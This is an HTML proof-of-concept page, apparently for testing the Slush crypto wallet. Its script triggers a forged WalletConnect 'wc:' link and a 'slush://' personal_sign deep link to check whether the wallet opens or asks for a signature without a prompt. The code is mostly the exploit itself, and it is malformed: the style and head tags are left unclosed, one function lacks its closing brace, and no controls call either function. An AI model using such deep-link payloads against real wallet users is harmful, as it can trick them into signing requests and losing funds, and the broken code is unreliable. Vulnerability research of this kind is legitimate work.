<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PoC | Deep Link Hijacking Slush</title>
    <style>
        :root { --accent: #ff00ff; --bg: #050505; }

        .exploit-card { border: 2px dashed var(--accent); padding: 20px; border-radius: 10px; background: #111; }
        .btn-link { background: var(--accent); color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin: 10px 0; }

<body>

<div class="exploit-card">

    <div id="log">Logs:<br></div>
</div>

<script>
    function addLog(msg) {
        document.getElementById('log').innerHTML += `> ${msg}<br>`;
    }

    function hijackWalletConnect() {
        
        const fakeWC = "wc:00e46b69-d0eb-46a2-934d-ce341961d46d@1?bridge=https%3A%2F%2Ff.bridge.walletconnect.org&key=deadbeef";
        addLog("Attempting to hijack 'wc:' protocol...");
        

        window.location.href = fakeWC;
        
        setTimeout(() => {
            addLog("Check if Slush Wallet opened automatically without prompt.");
        }, 1500);
    }

 
    function triggerMaliciousSign() {

        const maliciousURI = "slush://request?method=personal_sign&params=DANGER_MESSAGE";
        addLog("Triggering unverified sign request...");
        
        window.location.href = maliciousURI;
        
        alert("Jika aplikasi muncul dengan permintaan tanda tangan otomatis, ini adalah kerentanan High/Critical.");

</script>
